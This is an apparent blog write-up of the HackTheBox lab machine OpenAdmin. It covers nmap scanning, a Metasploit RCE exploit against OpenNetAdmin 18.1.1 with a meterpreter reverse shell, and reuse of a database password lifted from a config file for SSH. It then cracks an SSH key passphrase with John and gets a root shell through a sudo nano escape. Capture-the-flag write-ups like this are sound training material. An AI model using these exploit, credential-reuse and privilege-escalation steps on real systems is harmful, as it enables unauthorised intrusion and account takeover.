---
title: OpenAdmin
published: true
categories: HackTheBox
---


### [](#header-2)Inroduction

Openadmin from [HackTheBox](https://hackthebox.eu) got retierd. it's really cool box and i learned some new stuff like how add module to metasploit and how use GTFOBins. so lets get started.

### [](#header-3)1- Reconnaissance

using `nmap` to check the ports

```
# Nmap 7.80 scan initiated Sun Jan 12 14:31:45 2020 as: nmap -sC -sV -Pn -o scanning.nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT    STATE    SERVICE VERSION
22/tcp  open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp  open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
212/tcp filtered anet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 12 14:34:36 2020 -- 1 IP address (1 host up) scanned in 170.75 seconds
```
so `port 22` and `port 80` is open and the OS in ubuntu with apache version 2.4.29
-------------------------------------------------------------------------------------------------------------------------------------------------------

### [](#header-3)2- Discover & Vulnerablility Assessment

first trying to browse the website

![](https://raw.githubusercontent.com/Rado0z/Rado0z.github.io/master/assets/openadmin_apache.png)

so it defualt page for apache server.

the second part is to try brute-force the directories using `gobuster`

```
```

the `ona` directory look interesting, when browse i found that this opennetadmin application with version 18.1.1

![](https://raw.githubusercontent.com/Rado0z/Rado0z.github.io/master/assets/ona_directory.png)

and then i checked in google that there is RCE vulnerability in this version in exploit-db with metasploit [here](https://www.exploit-db.com/exploits/47772)
so i download it and put in in my metasploit module
```
cp opennetadmin.rb /opt/metasploit-framework/embedded/framework/modules/exploits/linux/http/
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
### [](#header-3)3- Exploitation

after adding the module in metasploite. now i run it and try to get meterpreter session.

```
msf5 exploit(linux/http/opennetadmin) > show options 

Module options (exploit/linux/http/opennetadmin):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.171     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /ona/login.php   yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.33      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf5 exploit(linux/http/opennetadmin) > exploit

[*] Started reverse TCP handler on 10.10.15.33:4444 
[*] Exploiting...
[*] Sending stage (3021284 bytes) to 10.10.10.171
[*] Command Stager progress - 100.12% done (809/808 bytes)
[*] Meterpreter session 1 opened (10.10.15.33:4444 -> 10.10.10.171:37090) at 2020-02-14 08:24:43 -0500

meterpreter > 

```
and BOOM!

NOTE: the opennetadmin did not work for me in first because it was by default the reverse_tcp payload is set to 0x86. so you should change to linux/0x64/meterpreter/reverse_tcp to works fine.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### [](#header-3)3- Post Exploitation to - USER 1 (jimmy)

the first thing after get meterpeter is that i used shell command. and spawning the shell in bash to get good bash terminal.

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins

python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$ 
```

first lets check the home directory to see the users there.

```
www-data@openadmin:/opt/ona/www$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  6 jimmy  jimmy  4096 Feb 14 13:35 jimmy
drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
www-data@openadmin:/opt/ona/www$ 
```

so we have jimmy and joanna. so after doing some enumuration in ona application i found file that have the username and password for the ona database.
```
www-data@openadmin:/opt/ona/www$ cat ./local/config/database_settings.inc.php
cat ./local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www$ 
```
so i used this password `n1nj4W4rri0R!` to login to ssh for jummy user

```
root@WebServer:~/Documents/HackTheBox/openadmin# ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 14 13:46:22 UTC 2020

  System load:  0.37              Processes:             438
  Usage of /:   50.1% of 7.81GB   Users logged in:       2
  Memory usage: 33%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb 14 13:34:15 2020 from 10.10.15.188
jimmy@openadmin:~$ 
```
-----------------------------------------------------------------------------------------------------------------------------------------------------
### [](#header-3)3- Post Exploitation to - USER 2 (joanna)
again with some emumaration i found folder called internal and only jimmy can see it

```
jimmy@openadmin:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22 18:15 .
drwxr-xr-x 14 root     root     4096 Nov 21 14:08 ..
drwxr-xr-x  6 www-data www-data 4096 Feb 14 13:31 html
drwxrwx---  2 jimmy    internal 4096 Feb 14 13:34 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Feb 14 13:49 .
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
jimmy@openadmin:/var/www/internal$ 

```
there is 3 php that server to some services.
then i try to look to any other ports that could serve this application by using `netstat -a' command

![](https://raw.githubusercontent.com/Rado0z/Rado0z.github.io/master/assets/netstat.png)

then browse this appliction using `curl`

![](https://raw.githubusercontent.com/Rado0z/Rado0z.github.io/master/assets/curl.png)

and now we got the Private key. next i tried to used to login throgh ssh to joanna
```
root@kali:~/Documents/HackTheBox/openadmin# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa': 
```
but i got passphrase. so to get that i tried to crack this Private key using johnTheRipper. but firs we shoud convert to hash using tool called `john2hash.py` and save to id_rsa.hash and then crack it using john

![](https://raw.githubusercontent.com/Rado0z/Rado0z.github.io/master/assets/john.png)

so i used this password for joanna and successfully logged in.

```
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb 14 14:10:02 2020 from 10.10.14.220
joanna@openadmin:~$ 
```

------------------------------------------------------------------------------------------------------------------------------------------
### [](#header-3)3- Post Exploitation to - ROOT
by looking to sudo -l i found this: 
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ 
```
the only this that i can use is `nano to priv file'

so the [GTFOBins](https://gtfobins.github.io/) website have i good way to get root shell from nano which is [this](https://gtfobins.github.io/gtfobins/nano/)
and here is the steps:
1. sudo nano /opt/priv
2. ctrl+r and ctrl+x
3. reset; sh 1>&0 2>&0

and then you got a root shell
![](https://raw.githubusercontent.com/Rado0z/Rado0z.github.io/master/assets/root.png)

i really will be happy for any feedback. Thank you so much
